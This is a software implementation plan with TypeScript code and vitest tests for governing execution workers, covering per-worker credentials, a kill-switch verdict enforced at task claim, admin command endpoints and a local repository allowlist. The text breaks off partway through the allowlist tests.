# Worker control plane, part A — governance Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Revision 2** — rewritten after an adversarial review found the first revision's Tasks 5–12 unimplementable as written and three named controls half-built.

**Goal:** Make the execution worker a governed client of the app — a server-assigned identity, a kill switch enforced where it cannot be bypassed *and* able to stop a run already in flight, policy from the server, and a repository binding the laptop consents to.

**Architecture:** The server owns identity, policy and commands; the laptop owns the capability of *where* code runs. Registration mints a per-worker credential; the claim endpoint and the heartbeat both re-ask one pure verdict function, so a lock cannot be honoured on one path and missed on another.

**Tech Stack:** Next.js 16 App Router route handlers, Mongoose 8 on MongoDB 4.4, vitest in both packages, Node 22+ for the worker.

## Global Constraints

- **MongoDB 4.4** — no `$dateTrunc`, `$dateAdd`/`$dateDiff`, `$setWindowFields`, no `$lookup` mixing `localField`/`foreignField` with an inline `pipeline`.
- **Any array (aggregation pipeline) update needs `updatePipeline: true`.** Mocked-Mongoose tests do not validate driver options — assert the option explicitly. This exact gap produced a 500 on the release path that the whole unit suite passed.
- **Document interfaces use `Types.ObjectId`**, not `string`, and expose a separate `Api*` interface for responses — follow `IApiToken` / `ApiApiToken` in `src/types/index.ts`.
- **Route handlers take `Request`**, and `context.params` is `Promise<Record<string, string>>` — follow the existing wrappers in `src/lib/middleware.ts`. There is no `Params` type.
- **A project identifier arriving in a URL may be a key or an ObjectId.** `resolveProjectId` is the only correct way to read one.
- Comments minimal. English for code and commits. Conventional commits, no trailers or footers.
- **Protocol version is `1`.** It travels in the `X-CP-Protocol` header on every worker request, and is re-read on every heartbeat.
- **No new dependencies** — check `npm ls <name>` first. bcryptjs, mongoose and vitest are present.

## Two credentials, deliberately

After this plan the worker holds **two** secrets and they are not interchangeable:

| Credential | Prefix | Used for | Verified by |
|---|---|---|---|
| API token | `cp_` | Everything on `/api/projects/**` — reports, release, project reads | `getAuthUser` |
| Worker credential | `cpw_` | `/tasks/claim` and `/api/workers/**` only | `verifyWorkerCredential` |

`getAuthUser` accepts only `cpat_` and `cp_` (`src/lib/auth.ts:127-131`), so swapping the `Authorization` header globally in `worker/src/api.ts` would 401 every report — which, because reports go through the outbox, would surface only as a silently growing `outbox.jsonl` and tasks stuck in the active column. `send()` therefore takes which credential to use, and `CP_API_TOKEN` remains required.

## Breaking window

Task 4 makes the claim require a worker credential. The worker cannot supply one until Task 7. **Between those commits the CP-158 rig and any installed worker are dead** — 401 on every poll, and `KeepAlive` in the plist will restart the process in a loop. Do not deploy `main` from inside that window. Task 7 ends the window and updates the README and plist.

---

## File Structure

**Server**

| File | Responsibility |
|---|---|
| `src/models/worker.ts` | The `Worker` schema: identity, credential hash, assignments, policy, governance flags |
| `src/lib/worker-service.ts` | Registration, credential verification, the governance verdict, heartbeat |
| `src/lib/middleware.ts` (modify) | `withWorker` — resolves a worker credential to a `Worker` document |
| `src/app/api/workers/register/route.ts` | Mint or reclaim an identity |
| `src/app/api/workers/[workerId]/heartbeat/route.ts` | Liveness, the abort verdict, command acknowledgement |
| `src/app/api/workers/[workerId]/route.ts` | Read and edit worker configuration |
| `src/app/api/workers/[workerId]/command/route.ts` | Issue pause / resume / stop |
| `src/app/api/workers/[workerId]/stream/route.ts` | SSE: commands, config, wake |
| `src/app/api/admin/workers/route.ts` | Fleet listing |
| `src/app/api/projects/[projectId]/tasks/claim/route.ts` (modify) | Enforce the verdict before claiming |
| `src/app/admin/workers/page.tsx` | The fleet console |

**Worker**

| File | Responsibility |
|---|---|
| `worker/src/registration.ts` | Register, persist the credential, heartbeat, surface the abort verdict |
| `worker/src/repos.ts` | The local allowlist and every refusal rule for a proposed path |
| `worker/src/control.ts` | SSE client: commands, config, `wake`, reconnect, degradation |
| `worker/src/config.ts` (modify) | Env demoted to bootstrap |
| `worker/src/api.ts` (modify) | Per-call credential selection, protocol header |
| `worker/src/exec.ts` (modify) | `AbortSignal` and `stdin` on `RunOpts` |
| `worker/src/pipeline.ts` (modify) | Abort checks between phases |
| `worker/src/loop.ts` (modify) | Pause state; stop implies pause |
| `worker/src/main.ts` (modify) | One `AbortController` per run, wired to the heartbeat verdict |

---

### Task 1: The `Worker` model and its policy

**Files:**
- Create: `src/models/worker.ts`
- Modify: `src/types/index.ts`, `src/models/project.ts`

**Interfaces:**
- Produces: `Worker` model, `IWorker`, `ApiWorker`, `WorkerAssignment`, `WorkerPolicy`

- [ ] **Step 1: Add the shared types**

In `src/types/index.ts`, beside the existing document interfaces:

```ts
export interface WorkerAssignment {
  project: Types.ObjectId;
  proposedPath: string;
}

export interface WorkerPolicy {
  baseBranch: string;
  pollIntervalMs: number;
  taskTimeoutMs: number;
  maxDiffLines: number;
  maxDiffFiles: number;
  model: string;
}

export interface IWorker {
  _id: Types.ObjectId;
  name: string;
  host: string;
  platform: string;
  version: string;
  protocolVersion: number;
  credentialHash: string;
  assignments: WorkerAssignment[];
  policy: WorkerPolicy;
  enabled: boolean;
  lockedByInstance: boolean;
  lastSeenAt: Date | null;
  bindingError: string;
  command: "" | "pause" | "resume" | "stop";
  commandIssuedAt: Date | null;
  commandAckedAt: Date | null;
  createdAt: Date;
  updatedAt: Date;
}

export interface ApiWorker extends Omit<IWorker, "_id" | "credentialHash" | "assignments"> {
  _id: string;
  assignments: Array<{ project: string; proposedPath: string }>;
  stale: boolean;
}
```

`bindingError` carries the worker's own refusal — "this path is not approved on this machine" — so the console can show why a worker is idle without inventing a second channel for it.

- [ ] **Step 2: Create the model**

`src/models/worker.ts`:

```ts
import mongoose, { Schema, Model } from "mongoose";
import { IWorker } from "@/types";

const workerSchema = new Schema<IWorker>(
  {
    name: { type: String, required: true, trim: true },
    host: { type: String, default: "" },
    platform: { type: String, default: "" },
    version: { type: String, default: "" },
    protocolVersion: { type: Number, required: true },
    credentialHash: { type: String, required: true },
    assignments: {
      type: [
        {
          project: { type: Schema.Types.ObjectId, ref: "Project", required: true },
          proposedPath: { type: String, default: "" },
        },
      ],
      default: [],
    },
    policy: {
      baseBranch: { type: String, default: "main" },
      pollIntervalMs: { type: Number, default: 30_000 },
      taskTimeoutMs: { type: Number, default: 1_800_000 },
      maxDiffLines: { type: Number, default: 400 },
      maxDiffFiles: { type: Number, default: 10 },
      model: { type: String, default: "opus" },
    },
    enabled: { type: Boolean, default: true },
    lockedByInstance: { type: Boolean, default: false },
    lastSeenAt: { type: Date, default: null },
    bindingError: { type: String, default: "" },
    command: { type: String, enum: ["", "pause", "resume", "stop"], default: "" },
    commandIssuedAt: { type: Date, default: null },
    commandAckedAt: { type: Date, default: null },
  },
  { timestamps: true }
);

workerSchema.index({ "assignments.project": 1 });
workerSchema.index({ name: 1, host: 1 }, { unique: true });

export const Worker: Model<IWorker> =
  mongoose.models.Worker || mongoose.model<IWorker>("Worker", workerSchema);
```

The unique index on `{name, host}` is what makes re-registration reclaim an identity instead of littering the fleet with ghosts.

- [ ] **Step 3: Remove the dead project field**

A path belongs to a worker, not a project — with two workers on one project `Project.repository.localPath` is not even well defined. Delete `localPath` from the `repository` block in `src/models/project.ts:216-220` and from `IProjectRepository` in `src/types/index.ts`. Leave `url` and `defaultBranch`.

- [ ] **Step 4: Verify it compiles**

Run: `npm run build`
Expected: succeeds. If `new Schema<IWorker>` complains, the interface and the schema disagree — fix the interface, not the schema.

- [ ] **Step 5: Commit**

```bash
git add src/models/worker.ts src/models/project.ts src/types/index.ts
git commit -m "feat(workers): worker identity, policy and assignments (CP-161)"
```

---

### Task 2: Registration and the governance verdict

The verdict is the heart of this plan: one pure function, so the claim and the heartbeat cannot answer the same question differently.

**Files:**
- Create: `src/lib/worker-service.ts`, `src/lib/worker-service.test.ts`

**Interfaces:**
- Consumes: `Worker`, `IWorker` (Task 1)
- Produces:
  - `PROTOCOL_VERSION: number`, `WORKER_STALE_MS: number`, `WORKER_HEARTBEAT_MS: number`
  - `verdictFor(worker, projectId, requestProtocol, now?): Verdict`
  - `registerWorker(input): Promise<{ worker: IWorker; credential: string }>`
  - `verifyWorkerCredential(workerId, credential): Promise<IWorker | null>`
  - `touchWorker(workerId, patch): Promise<void>`

- [ ] **Step 1: Write the failing test**

`src/lib/worker-service.test.ts`:

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";

const findById = vi.fn();
const findOneAndUpdate = vi.fn();
const updateOne = vi.fn();

vi.mock("./db", () => ({ connectDB: vi.fn() }));
vi.mock("@/models/worker", () => ({ Worker: { findById, findOneAndUpdate, updateOne } }));

const { verdictFor, verifyWorkerCredential, PROTOCOL_VERSION, WORKER_STALE_MS, WORKER_HEARTBEAT_MS } =
  await import("./worker-service");

const now = new Date("2026-08-01T12:00:00.000Z");
const fresh = new Date(now.getTime() - 1000);
const project = "69a52e3b399b27d3cbb2c5a5";

function worker(overrides: Record<string, unknown> = {}) {
  return {
    _id: "w1",
    enabled: true,
    lockedByInstance: false,
    protocolVersion: PROTOCOL_VERSION,
    lastSeenAt: fresh,
    assignments: [{ project, proposedPath: "/repo" }],
    ...overrides,
  } as never;
}

describe("verdictFor", () => {
  it("admits a healthy worker assigned to the project", () => {
    expect(verdictFor(worker(), project, PROTOCOL_VERSION, now)).toEqual({ ok: true });
  });

  it.each([
    ["disabled", { enabled: false }, /disabled/i],
    ["locked by the instance", { lockedByInstance: true }, /locked/i],
    ["not assigned to the project", { assignments: [] }, /assign/i],
  ])("refuses a worker %s", (_label, overrides, pattern) => {
    const verdict = verdictFor(worker(overrides), project, PROTOCOL_VERSION, now);

    expect(verdict.ok).toBe(false);
    expect((verdict as { reason: string }).reason).toMatch(pattern);
  });

  // The version the request speaks, not the one frozen into the record at registration --
  // otherwise a worker upgraded after a server bump is rejected forever with no way back
  it("refuses a request speaking an older protocol", () => {
    expect(verdictFor(worker(), project, PROTOCOL_VERSION - 1, now).ok).toBe(false);
  });

  it("refuses a request with no protocol at all", () => {
    const verdict = verdictFor(worker(), project, NaN, now);

    expect(verdict.ok).toBe(false);
    expect((verdict as { reason: string }).reason).toMatch(/protocol/i);
  });

  it("refuses a worker that has stopped heartbeating", () => {
    const stale = new Date(now.getTime() - WORKER_STALE_MS - 1);

    expect(verdictFor(worker({ lastSeenAt: stale }), project, PROTOCOL_VERSION, now).ok).toBe(false);
  });

  it("refuses a worker that has never heartbeaten", () => {
    expect(verdictFor(worker({ lastSeenAt: null }), project, PROTOCOL_VERSION, now).ok).toBe(false);
  });

  it("compares the project as a string, so an ObjectId assignment matches a resolved id", () => {
    const assignments = [{ project: { toString: () => project }, proposedPath: "/repo" }];

    expect(verdictFor(worker({ assignments }), project, PROTOCOL_VERSION, now)).toEqual({ ok: true });
  });

  // A worker heartbeating every WORKER_STALE_MS would race its own staleness check
  it("heartbeats comfortably inside the staleness window", () => {
    expect(WORKER_HEARTBEAT_MS * 2).toBeLessThan(WORKER_STALE_MS);
  });
});

describe("verifyWorkerCredential", () => {
  beforeEach(() => findById.mockReset());

  // An unauthenticated request must not be able to throw a CastError through the handler
  it("rejects a malformed worker id without touching the database", async () => {
    expect(await verifyWorkerCredential("not-an-object-id", "cpw_x")).toBeNull();
    expect(findById).not.toHaveBeenCalled();
  });

  it("rejects an unknown worker", async () => {
    findById.mockResolvedValue(null);

    expect(await verifyWorkerCredential("69a52e3b399b27d3cbb2c5a5", "cpw_x")).toBeNull();
  });
});
```

- [ ] **Step 2: Run to verify it fails**

Run: `npx vitest run src/lib/worker-service.test.ts`
Expected: FAIL — cannot resolve `./worker-service`.

- [ ] **Step 3: Implement**

`src/lib/worker-service.ts`:

```ts
import crypto from "crypto";
import bcrypt from "bcryptjs";
import { isValidObjectId } from "mongoose";
import { connectDB } from "./db";
import { Worker } from "@/models/worker";
import { IWorker } from "@/types";

export const PROTOCOL_VERSION = 1;
export const WORKER_STALE_MS = 5 * 60 * 1000;
export const WORKER_HEARTBEAT_MS = 60 * 1000;

export type Verdict = { ok: true } | { ok: false; reason: string };

export function verdictFor(
  worker: IWorker,
  projectId: string,
  requestProtocol: number,
  now = new Date()
): Verdict {
  if (requestProtocol !== PROTOCOL_VERSION) {
    return {
      ok: false,
      reason: `this worker speaks protocol ${requestProtocol || "none"}; the server speaks ${PROTOCOL_VERSION}`,
    };
  }
  if (!worker.enabled) return { ok: false, reason: "this worker is disabled" };
  if (worker.lockedByInstance) return { ok: false, reason: "this worker is locked by the instance" };

  const seen = worker.lastSeenAt ? new Date(worker.lastSeenAt).getTime() : 0;
  if (now.getTime() - seen > WORKER_STALE_MS) {
    return { ok: false, reason: "this worker has not reported in" };
  }

  const assigned = (worker.assignments ?? []).some(
    (a) => String(a.project) === String(projectId)
  );
  if (!assigned) return { ok: false, reason: "this worker has no assignment for this project" };

  return { ok: true };
}

export async function registerWorker(input: {
  name: string;
  host: string;
  platform: string;
  version: string;
}): Promise<{ worker: IWorker; credential: string }> {
  await connectDB();
  const credential = `cpw_${crypto.randomBytes(32).toString("hex")}`;

  // Re-registration reclaims the identity rather than creating a ghost that holds the
  // assignments while the live worker sits idle with none
  const worker = await Worker.findOneAndUpdate(
    { name: input.name, host: input.host },
    {
      $set: {
        ...input,
        protocolVersion: PROTOCOL_VERSION,
        credentialHash: await bcrypt.hash(credential, 10),
        lastSeenAt: new Date(),
      },
    },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );

  return { worker: worker as IWorker, credential };
}

export async function verifyWorkerCredential(
  workerId: string,
  credential: string
): Promise<IWorker | null> {
  if (!isValidObjectId(workerId)) return null;
  await connectDB();
  const worker = await Worker.findById(workerId);
  if (!worker) return null;
  return (await bcrypt.compare(credential, worker.credentialHash)) ? worker : null;
}

export async function touchWorker(
  workerId: string,
  patch: Partial<Pick<IWorker, "protocolVersion" | "version" | "commandAckedAt" | "bindingError">> = {}
): Promise<void> {
  await connectDB();
  await Worker.updateOne({ _id: workerId }, { $set: { lastSeenAt: new Date(), ...patch } });
}
```

- [ ] **Step 4: Run to verify it passes**

Run: `npx vitest run src/lib/worker-service.test.ts`
Expected: 12 passing.

- [ ] **Step 5: Commit**

```bash
git add src/lib/worker-service.ts src/lib/worker-service.test.ts
git commit -m "feat(workers): registration and the governance verdict (CP-161)"
```

---

### Task 3: `withWorker`, registration and heartbeat

**Files:**
- Modify: `src/lib/middleware.ts`
- Create: `src/app/api/workers/register/route.ts`, `src/app/api/workers/[workerId]/heartbeat/route.ts`

**Interfaces:**
- Consumes: Task 2
- Produces: `withWorker(handler)`, `protocolOf(request): number`

- [ ] **Step 1: Add the middleware**

In `src/lib/middleware.ts`, mirroring the existing wrappers' shape exactly — `Request`, `context.params` as a promise, no invented types:

```ts
export function protocolOf(request: Request): number {
  return Number(request.headers.get("x-cp-protocol") ?? NaN);
}

export function withWorker(
  handler: (
    request: Request,
    context: { params: Promise<Record<string, string>>; worker: IWorker }
  ) => Promise<Response>
) {
  return async (request: Request, context: { params: Promise<Record<string, string>> }) => {
    const header = request.headers.get("authorization") ?? "";
    const workerId = request.headers.get("x-worker-id") ?? "";
    if (!header.startsWith("Bearer ") || !workerId) {
      return NextResponse.json({ error: "Worker credential required" }, { status: 401 });
    }

    const worker = await verifyWorkerCredential(workerId, header.slice("Bearer ".length));
    if (!worker) {
      return NextResponse.json({ error: "Worker credential rejected" }, { status: 401 });
    }

    // The path segment is authoritative on /api/workers/:id, so a credential must not act on
    // someone else's record just because the route happens to carry an id
    const params = await context.params;
    if (params.workerId && params.workerId !== String(worker._id)) {
      return NextResponse.json({ error: "Not your worker" }, { status: 403 });
    }

    return handler(request, { ...context, worker });
  };
}
```

- [ ] **Step 2: Registration route**

`src/app/api/workers/register/route.ts`. **`withAdmin`, not `withAuth`**: registration mints a credential that can claim work, so it is an instance-level act, and the spec refuses scoped tokens for worker writes.

```ts
export const POST = withAdmin(async (request) => {
  await connectDB();
  const body = await request.json().catch(() => ({}));
  const name = typeof body.name === "string" ? body.name.trim() : "";
  const host = typeof body.host === "string" ? body.host.trim() : "";
  if (!name || !host) {
    return NextResponse.json({ error: "name and host are required" }, { status: 400 });
  }
  if (protocolOf(request) !== PROTOCOL_VERSION) {
    return NextResponse.json(
      { error: `server speaks protocol ${PROTOCOL_VERSION}` },
      { status: 409 }
    );
  }

  const { worker, credential } = await registerWorker({
    name,
    host,
    platform: String(body.platform ?? ""),
    version: String(body.version ?? ""),
  });

  return NextResponse.json({
    workerId: String(worker._id),
    credential,
    heartbeatMs: WORKER_HEARTBEAT_MS,
    policy: worker.policy,
    assignments: worker.assignments.map((a) => ({
      project: String(a.project),
      proposedPath: a.proposedPath,
    })),
  });
});
```

The response carries the policy and assignments, which is what makes Task 11 possible at all.

- [ ] **Step 3: Heartbeat route**

`src/app/api/workers/[workerId]/heartbeat/route.ts`. This is the only path that survives SSE loss, so it carries both the abort verdict and the command acknowledgement:

```ts
export const POST = withWorker(async (request, { worker }) => {
  const body = await request.json().catch(() => ({}));

  if (!worker.enabled || worker.lockedByInstance) {
    return NextResponse.json({ error: "this worker may not run", abort: true }, { status: 403 });
  }

  await touchWorker(String(worker._id), {
    protocolVersion: protocolOf(request),
    version: typeof body.version === "string" ? body.version : worker.version,
    ...(body.acked && body.acked === worker.command ? { commandAckedAt: new Date() } : {}),
    ...(typeof body.bindingError === "string" ? { bindingError: body.bindingError } : {}),
  });

  return NextResponse.json({
    command: worker.command,
    policy: worker.policy,
    assignments: worker.assignments.map((a) => ({
      project: String(a.project),
      proposedPath: a.proposedPath,
    })),
  });
});
```

- [ ] **Step 4: Verify the build**

Run: `npm run build`
Expected: succeeds.

- [ ] **Step 5: Commit**

```bash
git add src/lib/middleware.ts src/app/api/workers
git commit -m "feat(workers): credential middleware, registration and heartbeat (CP-161)"
```

---

### Task 4: Enforce the verdict at the claim

Until this lands, every governance flag is decorative.

**Files:**
- Modify: `src/app/api/projects/[projectId]/tasks/claim/route.ts`
- Create: `src/app/api/projects/[projectId]/tasks/claim/route.test.ts`

**Interfaces:**
- Consumes: `withWorker`, `protocolOf` (Task 3), `verdictFor` (Task 2), `resolveProjectId` (existing)

- [ ] **Step 1: Write the failing test**

The repository has no route-handler test yet; this is the first, and it guards the one enforcement point in the design.

`src/app/api/projects/[projectId]/tasks/claim/route.test.ts`:

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";

const verifyWorkerCredential = vi.fn();
const verdictFor = vi.fn();
const claimNextTask = vi.fn();
const releaseExpiredTasks = vi.fn();
const resolveProjectId = vi.fn();

vi.mock("@/lib/db", () => ({ connectDB: vi.fn() }));
vi.mock("@/lib/worker-service", () => ({
  verifyWorkerCredential,
  verdictFor,
  PROTOCOL_VERSION: 1,
}));
vi.mock("@/lib/task-service", () => ({ claimNextTask, releaseExpiredTasks }));

const { POST } = await import("./route");

const OID = "69a52e3b399b27d3cbb2c5a5";

function request(headers: Record<string, string>, body: unknown = { runId: "run-1" }) {
  return new Request("http://localhost/api/projects/CP/tasks/claim", {
    method: "POST",
    headers: { "content-type": "application/json", ...headers },
    body: JSON.stringify(body),
  });
}

const authed = {
  authorization: "Bearer cpw_secret",
  "x-worker-id": OID,
  "x-cp-protocol": "1",
};

beforeEach(() => {
  vi.clearAllMocks();
  resolveProjectId.mockResolvedValue(OID);
  verifyWorkerCredential.mockResolvedValue({ _id: OID, assignments: [] });
  verdictFor.mockReturnValue({ ok: true });
  claimNextTask.mockResolvedValue({ _id: "t1", taskNumber: 1 });
  releaseExpiredTasks.mockResolvedValue(0);
});

describe("POST /tasks/claim", () => {
  it("refuses a request with no worker credential", async () => {
    const response = await POST(request({}), { params: Promise.resolve({ projectId: "CP" }) });

    expect(response.status).toBe(401);
    expect(claimNextTask).not.toHaveBeenCalled();
  });

  // The control this whole plan exists for: it must hold on the polling path, with SSE gone
  it("refuses a locked worker even though its credential is valid", async () => {
    verdictFor.mockReturnValue({ ok: false, reason: "this worker is locked by the instance" });

    const response = await POST(request(authed), { params: Promise.resolve({ projectId: "CP" }) });

    expect(response.status).toBe(403);
    expect(claimNextTask).not.toHaveBeenCalled();
  });

  it("claims as the worker the credential identifies, not a body field", async () => {
    await POST(request(authed, { runId: "run-1", workerId: "someone-else" }), {
      params: Promise.resolve({ projectId: "CP" }),
    });

    expect(claimNextTask).toHaveBeenCalledWith(OID, OID, "run-1");
  });

  it("resolves a project key before asking the verdict or the claim", async () => {
    await POST(request(authed), { params: Promise.resolve({ projectId: "CP" }) });

    expect(resolveProjectId).toHaveBeenCalledWith("CP");
    expect(verdictFor.mock.calls[0][1]).toBe(OID);
  });

  // Otherwise locking the only worker of a project also stops the queue healing itself
  it("frees expired leases before the verdict can refuse the caller", async () => {
    verdictFor.mockReturnValue({ ok: false, reason: "locked" });

    await POST(request(authed), { params: Promise.resolve({ projectId: "CP" }) });

    expect(releaseExpiredTasks).toHaveBeenCalledWith(OID);
  });

  it("reports an empty queue as 204", async () => {
    claimNextTask.mockResolvedValue(null);

    const response = await POST(request(authed), { params: Promise.resolve({ projectId: "CP" }) });

    expect(response.status).toBe(204);
  });
});
```

`resolveProjectId` is imported from `@/lib/middleware`; add it to that module's mock alongside `withWorker`, which the test must stub to call the handler directly with a fabricated worker. Mock `@/lib/middleware` as:

```ts
vi.mock("@/lib/middleware", () => ({
  resolveProjectId,
  protocolOf: (r: Request) => Number(r.headers.get("x-cp-protocol") ?? NaN),
  withWorker:
    (handler: (req: Request, ctx: unknown) => Promise<Response>) =>
    async (req: Request, ctx: { params: Promise<Record<string, string>> }) => {
      const auth = req.headers.get("authorization") ?? "";
      const id = req.headers.get("x-worker-id") ?? "";
      if (!auth.startsWith("Bearer ") || !id) {
        return new Response(JSON.stringify({ error: "Worker credential required" }), { status: 401 });
      }
      const worker = await verifyWorkerCredential(id, auth.slice(7));
      if (!worker) return new Response("{}", { status: 401 });
      return handler(req, { ...ctx, worker });
    },
}));
```

- [ ] **Step 2: Run to verify it fails**

Run: `npx vitest run src/app/api/projects/\[projectId\]/tasks/claim/route.test.ts`
Expected: FAIL — the route still uses `withProjectAccess` and reads `workerId` from the body.

- [ ] **Step 3: Rewrite the route**

```ts
import { NextResponse } from "next/server";
import { connectDB } from "@/lib/db";
import { protocolOf, resolveProjectId, withWorker } from "@/lib/middleware";
import { claimNextTask, releaseExpiredTasks } from "@/lib/task-service";
import { verdictFor } from "@/lib/worker-service";

export const POST = withWorker(async (request, { params, worker }) => {
  const { projectId: identifier } = await params;
  await connectDB();

  const projectId = await resolveProjectId(identifier);
  if (!projectId) return NextResponse.json({ error: "Project not found" }, { status: 404 });

  // Before the verdict on purpose: locking the only worker of a project must not also stop the
  // queue from healing tasks its previous run abandoned
  await releaseExpiredTasks(projectId).catch(() => 0);

  const verdict = verdictFor(worker, projectId, protocolOf(request));
  if (!verdict.ok) return NextResponse.json({ error: verdict.reason }, { status: 403 });

  const { runId } = await request.json().catch(() => ({}));
  if (typeof runId !== "string" || !runId.trim()) {
    return NextResponse.json({ error: "runId is required" }, { status: 400 });
  }

  const task = await claimNextTask(projectId, String(worker._id), runId);
  if (!task) return new NextResponse(null, { status: 204 });

  return NextResponse.json(task);
});
```

`workerId` is gone from the body. `withProjectAccess` is gone: a worker is authorised by assignment, not by the token owner's project membership.

- [ ] **Step 4: Run to verify it passes**

Run: `npx vitest run && npm run build`
Expected: all pass.

- [ ] **Step 5: Commit**

```bash
git add "src/app/api/projects/[projectId]/tasks/claim"
git commit -m "fix(workers): enforce the instance lock where it cannot be bypassed (CP-161)"
```

**From this commit the CP-158 rig cannot claim until Task 7.** See *Breaking window* above.

---

### Task 5: Configuration and command endpoints

**Files:**
- Create: `src/app/api/workers/[workerId]/route.ts`, `src/app/api/workers/[workerId]/command/route.ts`, `src/app/api/admin/workers/route.ts`

**Interfaces:**
- Produces: `GET`/`PATCH /api/workers/:workerId`, `POST /api/workers/:workerId/command`, `GET /api/admin/workers`

- [ ] **Step 1: The configuration route**

`withProjectAdmin` cannot be used here — it reads `params.projectId` and returns `unresolvedProject` when absent (`src/lib/middleware.ts:139-142`), and this route carries `[workerId]`. One export also cannot be wrapped in two wrappers. So the route is `withAuth` and splits by blast radius **inside** the handler:

```ts
const ADMIN_FIELDS = ["assignments", "enabled", "lockedByInstance", "name"] as const;
const POLICY_FIELDS = [
  "baseBranch",
  "pollIntervalMs",
  "taskTimeoutMs",
  "maxDiffLines",
  "maxDiffFiles",
  "model",
] as const;

export const PATCH = withAuth(async (request, { params, user }) => {
  await connectDB();
  // A machine credential must not be able to retarget a laptop
  if (user.tokenScoped) {
    return NextResponse.json({ error: "Interactive admin session required" }, { status: 403 });
  }

  const { workerId } = await params;
  if (!isValidObjectId(workerId)) {
    return NextResponse.json({ error: "Worker not found" }, { status: 404 });
  }
  const worker = await Worker.findById(workerId);
  if (!worker) return NextResponse.json({ error: "Worker not found" }, { status: 404 });

  const body = await request.json().catch(() => ({}));
  const isAdmin = user.role === "admin";
  const update: Record<string, unknown> = {};

  for (const field of ADMIN_FIELDS) {
    if (!(field in body)) continue;
    if (!isAdmin) {
      return NextResponse.json({ error: `${field} is instance-admin only` }, { status: 403 });
    }
    update[field] = body[field];
  }

  for (const field of POLICY_FIELDS) {
    if (!(field in body)) continue;
    const allowed =
      isAdmin ||
      (await Promise.all(
        worker.assignments.map((a) => canAdminProject(user, String(a.project)))
      )).some(Boolean);
    if (!allowed) {
      return NextResponse.json({ error: `${field} requires project admin` }, { status: 403 });
    }
    update[`policy.${field}`] = body[field];
  }

  if (Object.keys(update).length === 0) {
    return NextResponse.json({ error: "Nothing to update" }, { status: 400 });
  }

  const updated = await Worker.findByIdAndUpdate(workerId, { $set: update }, { new: true });

  for (const assignment of worker.assignments) {
    await logProjectAudit(
      String(assignment.project),
      String(user._id),
      "worker_updated",
      Object.keys(update).join(", ")
    );
  }

  return NextResponse.json(toApiWorker(updated!));
});
```

`assignments` arrives as `[{ project, proposedPath }]` and is validated element by element: `project` must be a valid ObjectId, `proposedPath` a non-empty string. The path is stored as a **proposal**; whether it is ever used is the worker's local decision (Task 6).

`logProjectAudit` needs `"worker_updated"` added to the `action` enum in `src/models/projectAuditLog.ts`, or it throws a validation error that `logProjectAudit` swallows with a `console.warn` — an audit control that looks implemented and is not. A worker with no assignments produces no audit row; that is a known limit of a project-scoped audit log and is stated here rather than pretended away.

- [ ] **Step 2: The command route**

Nothing in Task 1's schema is writable without this; `command` is deliberately not in `ADMIN_FIELDS`, because issuing a command is an action with its own semantics, not a field edit.

```ts
export const POST = withAdmin(async (request, { params }) => {
  await connectDB();
  const { workerId } = await params;
  const { command } = await request.json().catch(() => ({}));
  if (!["pause", "resume", "stop"].includes(command)) {
    return NextResponse.json({ error: "command must be pause, resume or stop" }, { status: 400 });
  }

  const worker = await Worker.findByIdAndUpdate(
    workerId,
    { $set: { command, commandIssuedAt: new Date(), commandAckedAt: null } },
    { new: true }
  );
  if (!worker) return NextResponse.json({ error: "Worker not found" }, { status: 404 });

  return NextResponse.json({ command: worker.command, issuedAt: worker.commandIssuedAt });
});
```

`commandAckedAt` is cleared on issue and set by the heartbeat (Task 3) when the worker echoes `acked`. That pair is what lets the console distinguish *asked to pause* from *actually paused*.

- [ ] **Step 3: Self-read and fleet listing**

`GET /api/workers/:workerId` under `withWorker` so a worker can read its own record — Task 11 needs it after a restart, when the registration response is long gone. `GET /api/admin/workers` under `withAdmin`, returning `ApiWorker[]` with `credentialHash` stripped and `stale` derived from `WORKER_STALE_MS`.

- [ ] **Step 4: Verify the build**

Run: `npm run build`
Expected: succeeds.

- [ ] **Step 5: Commit**

```bash
git add src/app/api/workers src/app/api/admin/workers src/models/projectAuditLog.ts
git commit -m "feat(workers): configuration, commands and fleet listing (CP-161)"
```

---

### Task 6: `repos.ts` — the local allowlist

**Files:**
- Create: `worker/src/repos.ts`, `worker/src/repos.test.ts`

**Interfaces:**
- Consumes: `Runner` (`worker/src/exec.ts`)
- Produces:
  - `RepoDeps = { runner: Runner; readAllowlist: () => string; realpath: (p: string) => string; stat: (p: string) => { uid: number; mode: number }; uid: number }`
  - `bindRepository(deps: RepoDeps, proposedPath: string): Promise<{ ok: true; path: string; worktreeRoot: string } | { ok: false; reason: string }>`

- [ ] **Step 1: Write the failing test**

`worker/src/repos.test.ts`. One `depsWith` helper, defined once:

```ts
import { describe, it, expect, vi } from "vitest";
import { bindRepository, RepoDeps } from "./repos.js";

function depsWith(over: Partial<{
  allowlist: string[];
  realpath: (p: string) => string;
  gitConfig: string;
  toplevel: string;
  uid: number;
  mode: number;
  fileUid: number;
}> = {}): RepoDeps {
  const gitConfig = over.gitConfig ?? "";
  const toplevel = over.toplevel;
  return {
    runner: {
      run: vi.fn(async (_cmd: string, args: string[]) => ({
        code: 0,
        stdout: args.includes("--show-toplevel") ? (toplevel ?? "/repo") : gitConfig,
        stderr: "",
        timedOut: false,
      })),
    },
    readAllowlist: () => JSON.stringify({ repos: over.allowlist ?? ["/repo"] }),
    realpath: over.realpath ?? ((p: string) => p),
    stat: () => ({ uid: over.fileUid ?? 501, mode: over.mode ?? 0o755 }),
    uid: over.uid ?? 501,
  };
}

describe("bindRepository", () => {
  it("accepts an allowlisted repository that is its own toplevel", async () => {
    const result = await bindRepository(depsWith(), "/repo");

    expect(result.ok).toBe(true);
    expect((result as { worktreeRoot: string }).worktreeRoot).toContain("cp-worktrees");
  });

  it("refuses a path the operator never allowed", async () => {
    const result = await bindRepository(depsWith({ allowlist: ["/repo"] }), "/tmp/evil");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/not approved on this machine/i);
  });

  // Allowlist a benign path, then point a symlink somewhere else
  it("refuses when the allowlisted path resolves elsewhere", async () => {
    const deps = depsWith({ allowlist: ["/repo"], realpath: () => "/tmp/evil" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it.each([
